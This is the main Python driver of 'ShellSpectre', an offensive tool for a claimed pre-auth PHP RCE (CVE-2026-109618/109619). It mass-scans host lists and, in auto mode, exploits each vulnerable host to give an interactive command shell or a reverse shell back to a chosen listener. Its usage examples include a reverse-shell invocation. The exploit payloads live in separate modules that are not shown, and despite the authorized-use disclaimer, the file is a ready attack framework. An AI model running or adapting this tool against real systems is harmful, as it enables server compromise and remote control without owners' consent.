#!/usr/bin/env python3
"""ShellSpectre - CVE-2026-109618/109619 scanner & research tool."""

import argparse
import os
import sys
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlsplit

# Enable ANSI on Windows
if sys.platform == "win32":
    os.system("color")

class UI:

    
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    ITALIC = "\033[3m"
    UNDER  = "\033[4m"

    
    MAGENTA     = "\033[38;5;201m"
    PURPLE      = "\033[38;5;93m"
    INDIGO      = "\033[38;5;57m"
    CYAN        = "\033[38;5;51m"
    TEAL        = "\033[38;5;43m"
    GREEN       = "\033[38;5;82m"
    LIME        = "\033[38;5;118m"
    RED         = "\033[38;5;196m"
    ORANGE      = "\033[38;5;208m"
    YELLOW      = "\033[38;5;226m"
    BLUE        = "\033[38;5;27m"
    SKY         = "\033[38;5;39m"
    WHITE       = "\033[38;5;255m"
    GRAY        = "\033[38;5;245m"
    DARK        = "\033[38;5;236m"
    PINK        = "\033[38;5;213m"

    
    BG_RED      = "\033[48;5;196m"
    BG_GREEN    = "\033[48;5;28m"
    BG_DARK     = "\033[48;5;234m"
    BG_PURPLE   = "\033[48;5;54m"
    BG_TEAL     = "\033[48;5;30m"

    
    @staticmethod
    def rgb(r: int, g: int, b: int) -> str:
        return f"\033[38;2;{r};{g};{b}m"

    @staticmethod
    def bg_rgb(r: int, g: int, b: int) -> str:
        return f"\033[48;2;{r};{g};{b}m"

    _LEVEL_CFG = {
        "SCAN" : ("\033[38;5;51m",  "◈"),   # cyan
        "PROBE": ("\033[38;5;39m",  "◉"),   # sky blue
        "HIT"  : ("\033[38;5;82m",  "◆"),   # green  (success)
        "SHELL": ("\033[38;5;201m", "▶"),   # magenta
        "INFO" : ("\033[38;5;245m", "·"),   # gray
        "WARN" : ("\033[38;5;226m", "▲"),   # yellow
        "ERR"  : ("\033[38;5;196m", "✖"),   # red
        "OK"   : ("\033[38;5;118m", "✔"),   # lime
        "STAGE": ("\033[38;5;93m",  "⬡"),   # purple
    }

    _lock = threading.Lock()

    @classmethod
    def log(cls, level: str, msg: str) -> None:
        ts    = datetime.now().strftime("%H:%M:%S.") + f"{datetime.now().microsecond // 10000:02d}"
        color, sym = cls._LEVEL_CFG.get(level.upper(), (cls.GRAY, "·"))
        tag_str = f"{color}{BOLD if level in ('HIT','SHELL','ERR') else ''}{sym} {level:<5}{cls.RESET}"
        with cls._lock:
            print(f"  {cls.GRAY}{ts}{cls.RESET}  {tag_str}  {cls.WHITE}{msg}{cls.RESET}")

    @classmethod
    def stage_header(cls, title: str, num: int = 0, total: int = 0) -> None:
        chain = f" {cls.GRAY}CHAIN {num:02d}/{total:02d} {cls.RESET}" if num else " "
        inner = f"{cls.BOLD}{cls.PURPLE}{title}{cls.RESET}"
        bar   = cls.INDIGO + "═" * 2 + cls.RESET
        print()
        print(f"  {cls.INDIGO}╔{bar}[{chain}{inner}{cls.INDIGO}]{bar}╗{cls.RESET}")
        print()

    @classmethod
    def section(cls, title: str) -> None:
        width = 56
        pad = width - len(title) - 2
        left = pad // 2; right = pad - left
        print()
        print(f"  {cls.TEAL}{'─' * left} {cls.BOLD}{title}{cls.RESET}{cls.TEAL} {'─' * right}{cls.RESET}")
        print()

    @classmethod
    def result_box(cls, verdict: str, details: Dict[str, str], vuln: Optional[bool] = None) -> None:
        if vuln is True:
            tag_color = cls.RED; sym = "◆"
        elif vuln is False:
            tag_color = cls.GREEN; sym = "✔"
        else:
            tag_color = cls.YELLOW; sym = "▲"

        print()
        print(f"  {tag_color}{cls.BOLD}{sym} {verdict.upper()}{cls.RESET}")
        for key, val in details.items():
            print(f"    {cls.GRAY}{key:<12}{cls.RESET} : {cls.WHITE}{val}{cls.RESET}")
        print()

    @classmethod
    def shell_header(cls, target: str) -> None:
        print()
        print(f"  {cls.BOLD}{cls.BG_PURPLE}{cls.WHITE}  ▶  INTERACTIVE SHELL — {target}  {cls.RESET}")
        print(f"  {cls.GRAY}  Type 'exit' or Ctrl+C to terminate the session.{cls.RESET}")
        print()

    @classmethod
    def shell_output(cls, text: str) -> None:
        for line in text.splitlines():
            print(f"  {cls.LIME}{line}{cls.RESET}")

    @classmethod
    def shell_prompt(cls, host: str, cwd: str = "~") -> str:
        return (
            f"\n  {cls.PURPLE}┌─[{cls.RESET}{cls.BOLD}{cls.MAGENTA}spectre{cls.RESET}"
            f"{cls.PURPLE}@{cls.RESET}{cls.CYAN}{host}{cls.RESET}{cls.PURPLE}]"
            f"─[{cls.RESET}{cls.YELLOW}{cwd}{cls.RESET}{cls.PURPLE}]{cls.RESET}\n"
            f"  {cls.PURPLE}└─{cls.RESET}{cls.BOLD}{cls.GREEN}${cls.RESET} "
        )

    @classmethod
    def banner(cls) -> None:
        # Gradient: magenta (201) → purple (93) → indigo (57) → cyan (51)
        G = [
            cls.rgb(255,  50, 220),  # row 0 — hot magenta
            cls.rgb(200,  60, 255),  # row 1 — violet
            cls.rgb(140,  80, 255),  # row 2 — purple
            cls.rgb( 80, 120, 255),  # row 3 — indigo-blue
            cls.rgb( 40, 180, 255),  # row 4 — sky-cyan
            cls.rgb(  0, 230, 240),  # row 5 — cyan
            cls.rgb( 60, 255, 200),  # row 6 — teal
        ]
        lines = [
            r" ░██████╗██╗  ██╗███████╗██╗     ██╗     ",
            r" ██╔════╝██║  ██║██╔════╝██║     ██║     ",
            r" ╚█████╗ ███████║█████╗  ██║     ██║     ",
            r"  ╚═══██╗██╔══██║██╔══╝  ██║     ██║     ",
            r" ██████╔╝██║  ██║███████╗███████╗███████╗",
            r" ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝",
        ]
        spectre_lines = [
            r" ███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ███████╗",
            r" ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝",
            r" ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝█████╗  ",
            r" ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██╔══╝  ",
            r" ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║███████╗",
            r" ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝",
        ]
        print()
        for i, (a, b) in enumerate(zip(lines, spectre_lines)):
            color  = G[min(i, len(G) - 1)]
            # SHELL in slightly dimmer shade, SPECTRE brighter
            shell_c   = G[min(i, len(G) - 1)]
            spectre_c = cls.rgb(
                min(255, int(40  + i * 35)),
                min(255, int(200 + i * 8)),
                min(255, int(220 + i * 5)),
            )
            print(f"  {shell_c}{cls.BOLD}{a}{cls.RESET}  "
                  f"{spectre_c}{cls.BOLD}{b}{cls.RESET}")
        print()
        
        cve_color = cls.rgb(255, 100, 180)
        tag_color = cls.GRAY
        print(
            f"  {cve_color}{cls.BOLD}CVE-2026-109618 / CVE-2026-109619{cls.RESET}  "
            f"{tag_color}·  pre-auth PHP multipart RCE  ·  scan → exploit → shell{cls.RESET}"
        )
        print(
            f"  {cls.CYAN}Version: {cls.WHITE}2.6{cls.RESET}  "
            f"{cls.GRAY}·{cls.RESET}  "
            f"{cls.PURPLE}Github: {cls.WHITE}ameeshaheshan{cls.RESET}  "
            f"{cls.GRAY}·  authorized security research framework{cls.RESET}"
        )
        print()

    @classmethod
    def disclaimer(cls) -> None:
        lines = [
            "┌──────────────────────────────────────────────────────────┐",
            "│              AUTHORIZED USE ONLY — NOTICE                │",
            "├──────────────────────────────────────────────────────────┤",
            "│  ShellSpectre is a security research tool designed for   │",
            "│  use exclusively on systems you own or have been given   │",
            "│  explicit written authorization to test.                 │",
            "│                                                          │",
            "│  Unauthorized use against third-party systems is         │",
            "│  illegal and unethical. The authors accept no liability  │",
            "│  for misuse of this software.                            │",
            "└──────────────────────────────────────────────────────────┘",
        ]
        print()
        for line in lines:
            print(f"  {cls.YELLOW}{cls.BOLD}{line}{cls.RESET}")
        print()

    @classmethod
    def summary_box(cls, total: int, vuln: int, fixed: int, errors: int) -> None:
        print()
        print(f"  {cls.INDIGO}╔{'═' * 46}╗{cls.RESET}")
        print(f"  {cls.INDIGO}║{cls.BOLD}{cls.WHITE}{'  SCAN SUMMARY':^46}{cls.RESET}{cls.INDIGO}║{cls.RESET}")
        print(f"  {cls.INDIGO}╠{'═' * 46}╣{cls.RESET}")

        def row(label, val, color=""):
            pad = 46 - len(label) - len(str(val)) - 4
            print(f"  {cls.INDIGO}║{cls.RESET}  {cls.GRAY}{label}{cls.RESET}"
                  f"{' ' * max(0, pad)}{color}{cls.BOLD}{val}{cls.RESET}  {cls.INDIGO}║{cls.RESET}")

        row("Total scanned",    total)
        row("Vulnerable",       vuln,   cls.RED   if vuln   else cls.GREEN)
        row("Not vulnerable",   fixed,  cls.GREEN)
        row("Inconclusive",     errors, cls.YELLOW if errors else cls.GRAY)
        print(f"  {cls.INDIGO}╚{'═' * 46}╝{cls.RESET}")
        print()

BOLD = UI.BOLD  # used in log() without cls prefix

def preflight_profile(host: str, timeout: int, verify_ssl: bool, custom_headers: dict) -> dict:
    scanner = _import_scanner()
    norm_url = scanner.normalize_url(host)
    resp = scanner.send_post(norm_url, b"", "none", custom_headers, timeout, verify_ssl, follow_redirects=True)
    
    server_hdr = resp.headers.get("Server", "Unknown")
    powered_by = resp.headers.get("X-Powered-By", "")
    cookies = resp.headers.get("Set-Cookie", "")
    
    sapi_guess = "unknown"
    if "apache" in server_hdr.lower() and not "fpm" in server_hdr.lower():
        sapi_guess = "mod_php"
    elif "nginx" in server_hdr.lower() or "fpm" in server_hdr.lower():
        sapi_guess = "fpm"
    elif "litespeed" in server_hdr.lower() or "lsphp" in server_hdr.lower():
        sapi_guess = "lsphp (LiteSpeed)"
    
    return {
        "server": server_hdr,
        "powered_by": powered_by or "(not disclosed)",
        "sapi_guess": sapi_guess,
        "status_code": resp.status_code
    }

def baseline_calibrate(host: str, timeout: int, verify_ssl: bool, custom_headers: dict) -> dict:
    scanner = _import_scanner()
    norm_url = scanner.normalize_url(host)
    
    # 1. Normal control request
    ctrl = scanner.send_post(norm_url, scanner.CONTROL_BODY, scanner.CONTROL_BOUNDARY,
                             custom_headers, timeout, verify_ssl, follow_redirects=True)
    
    return {
        "ctrl_status": ctrl.status_code,
        "ctrl_len": len(ctrl.body) if ctrl.body else 0,
        "is_natively_500": bool(ctrl.status_code and ctrl.status_code >= 500),
        "is_natively_blocked": bool(ctrl.status_code in scanner.REJECTED_STATUSES)
    }

def _import_scanner():
    import importlib.util, pathlib
    here   = pathlib.Path(__file__).parent
    spec   = importlib.util.spec_from_file_location("scanner", here / "scanner.py")
    mod    = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

class ScannerLogger:
    def __init__(self, host: str):
        self.host = host

    def log(self, level: str, msg: str):
        UI.log(level, msg)

    def stage(self, title: str):
        UI.section(title)

def run_scan(
    hosts: List[str],
    timeout: int,
    verify_ssl: bool,
    custom_headers: dict,
    sapi: str,
    paths: Optional[List[str]],
    follow_redirects: bool,
    threads: int,
    quiet: bool,
    verbose: bool,
    calibrate: bool = False,
    preflight: bool = False,
    delay: float = 0.0,
) -> List[dict]:
    from concurrent.futures import ThreadPoolExecutor, as_completed

    try:
        from tqdm import tqdm
        HAS_TQDM = True
    except ImportError:
        HAS_TQDM = False

    scanner = _import_scanner()

    results: List[dict] = []
    total   = len(hosts)

    def scan_one(host: str) -> dict:
        try:
            if delay > 0:
                time.sleep(delay)

            # Optional Pre-flight profiling
            if preflight:
                pf = preflight_profile(host, timeout, verify_ssl, custom_headers)
                UI.log("INFO", f"[{host}] Preflight: Server={pf['server']} | SAPI={pf['sapi_guess']} | PHP={pf['powered_by']}")

            # Optional Baseline calibration
            if calibrate:
                cal = baseline_calibrate(host, timeout, verify_ssl, custom_headers)
                if cal["is_natively_500"]:
                    UI.log("WARN", f"[{host}] Calibration: Target natively returns HTTP {cal['ctrl_status']} — differential check active")

            res = scanner.check_vulnerability(
                host,
                timeout        = timeout,
                verify_ssl     = verify_ssl,
                custom_headers = custom_headers,
                sapi           = sapi,
                paths          = paths,
                follow_redirects = follow_redirects,
            )

            # If calibrate enabled and target natively 500s, prevent false positive crash verdict
            if calibrate and res.get("vulnerable") is True and cal.get("is_natively_500"):
                res["vulnerable"] = None
                res["verdict"] = "INCONCLUSIVE"
                res["reason"] = "Calibration suppressed false positive: target natively returns HTTP 500 on control requests"

            return res
        except Exception as exc:
            r = scanner.base_result(scanner.safe_url_label(host))
            r["error"]  = f"unexpected error: {exc}"
            r["reason"] = r["error"]
            return r

    def print_result(result: dict) -> None:
        host    = result["host"]
        verdict = result["verdict"]
        vuln    = result["vulnerable"]
        if vuln is True:
            UI.log("HIT",  f"{host}  —  {UI.RED}{UI.BOLD}VULNERABLE{UI.RESET}")
        elif vuln is False:
            UI.log("OK",   f"{host}  —  {UI.GREEN}NOT VULNERABLE{UI.RESET}  [{verdict}]")
        else:
            UI.log("WARN", f"{host}  —  {UI.YELLOW}{verdict}{UI.RESET}")

        if verbose and result.get("reason"):
            UI.log("INFO", f"  {result['reason']}")
        if result.get("final_url") and result.get("final_url") != result.get("tested_url"):
            UI.log("INFO", f"  → Retargeted: {result['final_url']}")
        if verbose and result.get("powered_by"):
            UI.log("INFO", f"  Powered-By: {result['powered_by']}")

    if total == 1:
        UI.stage_header("Target Analysis", 1, 1)
        result = scan_one(hosts[0])
        results.append(result)
        if not quiet or result["vulnerable"] is True:
            print_result(result)
    else:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_one, h): h for h in hosts}
            if HAS_TQDM and not quiet:
                bar_fmt = (
                    f"  {UI.PURPLE}{{l_bar}}{UI.RESET}"
                    f"{UI.CYAN}{{bar}}{UI.RESET}"
                    f"{UI.GRAY}{{r_bar}}{UI.RESET}"
                )
                pbar = tqdm(total=total, desc=f"  {UI.CYAN}Scanning{UI.RESET}",
                            bar_format=bar_fmt, unit="host", ncols=70)
            else:
                pbar = None

            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                if result["vulnerable"] is True or (not quiet and verbose):
                    if pbar:
                        with tqdm.external_write_mode():
                            print_result(result)
                    else:
                        print_result(result)
                if pbar:
                    pbar.update(1)

            if pbar:
                pbar.close()

    return results

class ExploitLogger:
    def log(self, level: str, msg: str):
        UI.log(level, msg)

    def stage(self, title: str):
        UI.section(title)

def run_exploit(
    target_url: str,
    timeout: int,
    verify_ssl: bool,
    custom_headers: dict,
    profile: str,
    exploit_cmd: str,
    shell_type: str,
    lhost: Optional[str],
    lport: Optional[int],
) -> bool:
    from exploit import ShellSpectreExploit

    logger   = ExploitLogger()
    exploiter = ShellSpectreExploit(
        target_url     = target_url,
        timeout        = timeout,
        verify_ssl     = verify_ssl,
        custom_headers = custom_headers,
        profile        = profile,
        logger         = logger,
    )

    UI.stage_header("Exploit Chain", 1, 3)
    UI.log("SHELL", f"Target: {target_url}")
    UI.log("INFO",  f"Command: {exploit_cmd}")
    UI.log("INFO",  f"Profile: {profile}")

    result = exploiter.run(command=exploit_cmd)

    if result.success:
        UI.result_box(
            "PRE-AUTH RCE CONFIRMED",
            {
                "Target"    : target_url,
                "Strategy"  : result.strategy,
                "Shell URL" : result.shell_url or "—",
                "Proof"     : result.proof_output[:60] + ("…" if len(result.proof_output) > 60 else ""),
            },
            vuln=True,
        )

        if shell_type == "reverse" and lhost and lport:
            UI.log("SHELL", f"Spawning reverse shell → {lhost}:{lport}")
            exploiter.spawn_reverse_shell(lhost, lport, result.shell_url)
        else:
            # Interactive cmd shell
            exploiter.interactive_shell(result.shell_url)

        return True
    else:
        UI.result_box(
            "EXPLOIT FAILED",
            {
                "Target" : target_url,
                "Error"  : result.error or "Unknown",
                "Stages" : ", ".join(result.stages),
            },
            vuln=False,
        )
        return False

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="shellspectre",
        description="ShellSpectre — CVE-2026-109618/109619 Research Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python shellspectre.py --mode scan -u https://target.local
  python shellspectre.py --mode exploit -u https://target.local --exploit-cmd "id;uname -a"
  python shellspectre.py --mode auto -u https://target.local --shell-type reverse --lhost 10.0.0.1 --lport 4444
  python shellspectre.py --mode scan -l hosts.txt -t 20 -o results.json
  python shellspectre.py --disclaimer
        """,
    )

    p.add_argument("--disclaimer", action="store_true",
                   help="Print authorized-use-only notice and exit")

    # Mode
    p.add_argument(
        "--mode", choices=("scan", "exploit", "auto"), default="scan",
        help="Operation mode: scan | exploit | auto (default: scan)",
    )

    # Target
    target = p.add_mutually_exclusive_group()
    target.add_argument("-u", "--url",  help="Single URL/host to test")
    target.add_argument("-l", "--list", help="File of hosts (one per line)")

    # Scanner options
    p.add_argument("-t", "--threads",   type=int, default=10,
                   help="Concurrent threads (default: 10)")
    p.add_argument("--timeout",         type=int, default=60,
                   help="Request timeout seconds (default: 60)")
    p.add_argument("-o", "--output",    help="JSON output file")
    p.add_argument("--all-results",     action="store_true",
                   help="Save all results, not just vulnerable")
    p.add_argument("-k", "--insecure",  action="store_true",
                   help="Disable TLS certificate verification")
    p.add_argument("--follow-redirects",action="store_true",
                   help="Follow HTTP redirects (up to 10 hops)")
    p.add_argument("-H", "--header",    action="append", dest="headers",
                   metavar="HEADER",    help="Custom header 'Key: Value' (repeatable)")
    p.add_argument("-v", "--verbose",   action="store_true",
                   help="Verbose output — show reasons and response snippets")
    p.add_argument("-q", "--quiet",     action="store_true",
                   help="Only print vulnerable hosts")
    p.add_argument("--no-color",        action="store_true",
                   help="Disable ANSI color output")
    p.add_argument("--sapi",            choices=("auto", "mod_php", "fpm"), default="auto",
                   help="SAPI verdict rules (default: auto)")
    p.add_argument("--path",            action="append", dest="paths",
                   help="Custom path to test (repeatable)")
    p.add_argument("--path-file",       help="File of paths to test (one per line)")

    # Exploit options
    p.add_argument("--exploit-cmd",     default="id",
                   help="Command to run as proof of execution (default: id)")
    p.add_argument("--lhost",           help="Local IP for reverse shell listener")
    p.add_argument("--lport",           type=int, help="Local port for reverse shell listener")
    p.add_argument("--shell-type",      choices=("cmd", "reverse"), default="cmd",
                   help="Shell type: cmd (interactive) | reverse (connect-back, default: cmd)")
    p.add_argument("--profile",         choices=("auto", "debian", "redhat", "generic"),
                   default="auto",
                   help="Exploit offset profile (default: auto-detect from fingerprint)")

    p.add_argument("--calibrate", action="store_true",
                   help="Perform dynamic baseline calibration (reduces false positives)")
    p.add_argument("--preflight", action="store_true",
                   help="Perform deep SAPI and web server pre-flight profiling before scanning")
    p.add_argument("--format", choices=("json", "csv", "markdown"), default="json",
                   help="Output report format (json | csv | markdown, default: json)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Delay in seconds between requests (rate limiting, default: 0.0)")

    return p

def _strip_colors() -> None:
    for attr in dir(UI):
        if attr.isupper() and isinstance(getattr(UI, attr), str):
            setattr(UI, attr, "")

def _load_lines(path: str, label: str) -> List[str]:
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    except OSError as exc:
        UI.log("ERR", f"Cannot read {label} file: {exc}")
        sys.exit(1)

def _parse_headers(header_list: Optional[List[str]]) -> dict:
    headers = {}
    for h in header_list or []:
        if ":" not in h:
            raise ValueError(f"Invalid header {h!r} — expected 'Key: Value'")
        key, val = h.split(":", 1)
        headers[key.strip()] = val.lstrip()
    return headers

def _deduplicate(hosts: List[str]) -> List[str]:
    from urllib.parse import urlsplit, urlunsplit
    seen, out = set(), []
    for h in hosts:
        try:
            raw = h if "://" in h else "https://" + h
            p   = urlsplit(raw)
            key = (p.scheme.lower(), p.netloc.lower(), p.path)
        except Exception:
            key = (h,)
        if key not in seen:
            seen.add(key); out.append(h)
    return out

def clear_screen() -> None:
    """Clear terminal screen across Windows, Linux, and macOS."""
    import platform
    cmd = "cls" if platform.system() == "Windows" else "clear"
    os.system(cmd)

def bootstrap_environment() -> None:
    """
    Detects OS, sets up a local virtual environment (.venv) if not active,
    installs requirements if missing, and executes within the venv.
    When execution finishes or the user exits, control returns to the caller shell.
    """
    in_venv = (sys.prefix != getattr(sys, "base_prefix", sys.prefix)) or bool(os.environ.get("VIRTUAL_ENV"))
    if in_venv:
        return

    import platform
    import subprocess
    import pathlib

    project_dir = pathlib.Path(__file__).resolve().parent
    venv_dir = project_dir / ".venv"
    req_file = project_dir / "requirements.txt"

    if platform.system() == "Windows":
        venv_python = venv_dir / "Scripts" / "python.exe"
    else:
        venv_python = venv_dir / "bin" / "python"

    if not venv_python.exists():
        import venv
        print(f"  {UI.GRAY}[*] Initializing virtual environment in .venv ...{UI.RESET}")
        venv.create(venv_dir, with_pip=True)

    if req_file.exists():
        check_proc = subprocess.run([str(venv_python), "-c", "import h11, tqdm"], capture_output=True)
        if check_proc.returncode != 0:
            print(f"  {UI.GRAY}[*] Installing dependencies from requirements.txt into .venv ...{UI.RESET}")
            subprocess.run([str(venv_python), "-m", "pip", "install", "--quiet", "-r", str(req_file)], check=True)

    env = os.environ.copy()
    env["VIRTUAL_ENV"] = str(venv_dir)
    res = subprocess.run([str(venv_python)] + sys.argv, env=env)
    sys.exit(res.returncode)

def main() -> None:
    clear_screen()
    args = build_parser().parse_args()

    # Disclaimer
    if args.disclaimer:
        UI.banner()
        UI.disclaimer()
        sys.exit(0)

    # Color handling
    if args.no_color or not sys.stdout.isatty():
        _strip_colors()
        global BOLD
        BOLD = ""

    if not args.quiet:
        UI.banner()

    # Argument validation
    if args.mode in ("scan", "auto") and not args.url and not args.list:
        UI.log("ERR", "Provide a target: -u <url> or -l <file>")
        sys.exit(1)
    if args.mode == "exploit" and not args.url:
        UI.log("ERR", "Exploit mode requires a single target: -u <url>")
        sys.exit(1)
    if args.shell_type == "reverse" and not (args.lhost and args.lport):
        UI.log("ERR", "Reverse shell requires --lhost and --lport")
        sys.exit(1)
    if args.threads < 1:
        raise SystemExit("--threads must be >= 1")
    if args.timeout < 1:
        raise SystemExit("--timeout must be >= 1")

    try:
        custom_headers = _parse_headers(args.headers)
    except ValueError as exc:
        UI.log("ERR", str(exc))
        sys.exit(1)

    verify_ssl = not args.insecure

    # Load hosts
    if args.url:
        hosts = [args.url]
    else:
        raw_hosts = _load_lines(args.list, "host")
        hosts = _deduplicate(raw_hosts)
        if len(hosts) != len(raw_hosts):
            UI.log("INFO", f"Deduplicated {len(raw_hosts) - len(hosts)} duplicate host(s)")

    if not hosts:
        UI.log("ERR", "No hosts to scan")
        sys.exit(1)

    # Load paths
    paths = None
    if args.path_file:
        paths = _load_lines(args.path_file, "path")
    elif args.paths:
        paths = args.paths
    if paths == []:
        UI.log("ERR", "No paths to scan")
        sys.exit(1)

    # Print config
    if not args.quiet:
        UI.log("INFO", f"Hosts loaded:  {len(hosts)}")
        UI.log("INFO", f"Mode:          {args.mode.upper()}")
        UI.log("INFO", f"Threads:       {args.threads}")
        UI.log("INFO", f"Timeout:       {args.timeout}s")
        UI.log("INFO", f"SAPI rules:    {args.sapi}")
        if paths:
            UI.log("INFO", f"Paths:         {len(paths)} custom path(s)")
        if args.insecure:
            UI.log("WARN", "TLS verification disabled")
        if args.mode in ("exploit", "auto"):
            UI.log("INFO", f"Profile:       {args.profile}")
            UI.log("INFO", f"Shell type:    {args.shell_type}")

    # SCAN mode
    if args.mode == "scan":
        results = run_scan(
            hosts, args.timeout, verify_ssl, custom_headers,
            args.sapi, paths, args.follow_redirects,
            args.threads, args.quiet, args.verbose,
            calibrate=args.calibrate, preflight=args.preflight, delay=args.delay,
        )
        _finish(args, results)

    elif args.mode == "exploit":
        success = run_exploit(
            args.url, args.timeout, verify_ssl, custom_headers,
            args.profile, args.exploit_cmd,
            args.shell_type, args.lhost, args.lport,
        )
        sys.exit(0 if success else 1)

    elif args.mode == "auto":
        results = run_scan(
            hosts, args.timeout, verify_ssl, custom_headers,
            args.sapi, paths, args.follow_redirects,
            args.threads, args.quiet, args.verbose,
            calibrate=args.calibrate, preflight=args.preflight, delay=args.delay,
        )

        vuln_hosts = [r["host"] for r in results if r.get("vulnerable") is True]
        if not vuln_hosts:
            UI.log("INFO", "No vulnerable targets found — exploit stage skipped")
            _finish(args, results)
            return

        UI.section(f"Auto-Exploit: {len(vuln_hosts)} vulnerable target(s)")
        any_success = False
        for target in vuln_hosts:
            UI.log("SHELL", f"Launching exploit → {target}")
            success = run_exploit(
                target, args.timeout, verify_ssl, custom_headers,
                args.profile, args.exploit_cmd,
                args.shell_type, args.lhost, args.lport,
            )
            if success:
                any_success = True
                # In auto mode with multiple targets, ask before continuing
                if len(vuln_hosts) > 1:
                    try:
                        more = input(f"\n  {UI.YELLOW}Continue to next target? [y/N]{UI.RESET} ").strip().lower()
                    except (EOFError, KeyboardInterrupt):
                        more = "n"
                    if more != "y":
                        break

        _finish(args, results)
        sys.exit(0 if any_success else 1)

def _finish(args, results: List[dict]) -> None:
    scanner = _import_scanner()

    total  = len(results)
    vuln   = sum(r["vulnerable"] is True  for r in results)
    fixed  = sum(r["vulnerable"] is False for r in results)
    errors = sum(r["vulnerable"] is None  for r in results)

    if not args.quiet:
        UI.summary_box(total, vuln, fixed, errors)

    if args.output:
        selected = (
            [r for r in results if r.get("vulnerable") is True]
            if not args.all_results else results
        )
        import json, datetime, csv
        fmt = getattr(args, "format", "json").lower()
        now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()

        try:
            if fmt == "csv":
                with open(args.output, "w", encoding="utf-8", newline="") as fh:
                    writer = csv.writer(fh)
                    writer.writerow(["Timestamp", "Host", "Verdict", "Vulnerable", "Status", "SAPI", "PHP_Version", "Reason"])
                    for r in selected:
                        writer.writerow([
                            r.get("timestamp", now_iso),
                            r.get("host", ""),
                            r.get("verdict", ""),
                            r.get("vulnerable", ""),
                            r.get("status_code", ""),
                            r.get("sapi", ""),
                            r.get("powered_by", ""),
                            r.get("reason", "")
                        ])
            elif fmt == "markdown":
                with open(args.output, "w", encoding="utf-8") as fh:
                    fh.write(f"# ShellSpectre Scan Report\n\n")
                    fh.write(f"- **Scan Time:** {now_iso}\n")
                    fh.write(f"- **Total Scanned:** {total} | **Vulnerable:** {vuln} | **Not Vulnerable:** {fixed}\n\n")
                    fh.write("| Host | Verdict | SAPI | PHP Version | Status | Reason |\n")
                    fh.write("|---|---|---|---|---|---|\n")
                    for r in selected:
                        v = "**VULNERABLE**" if r.get("vulnerable") is True else r.get("verdict", "")
                        fh.write(f"| `{r.get('host', '')}` | {v} | {r.get('sapi', '-')} | {r.get('powered_by', '-')} | {r.get('status_code', '-')} | {r.get('reason', '')} |\n")
            else: # JSON (default)
                output = {
                    "scan_time":     now_iso,
                    "format":        "json",
                    "total_results": len(selected),
                    "results":       selected,
                }
                with open(args.output, "w", encoding="utf-8") as fh:
                    json.dump(output, fh, indent=2)

            UI.log("OK", f"Results saved [{fmt.upper()}] → {args.output}")
        except OSError as exc:
            UI.log("ERR", f"Failed to save results: {exc}")
            sys.exit(2)

    sys.exit(1 if vuln else 0)

if __name__ == "__main__":
    bootstrap_environment()
    main()

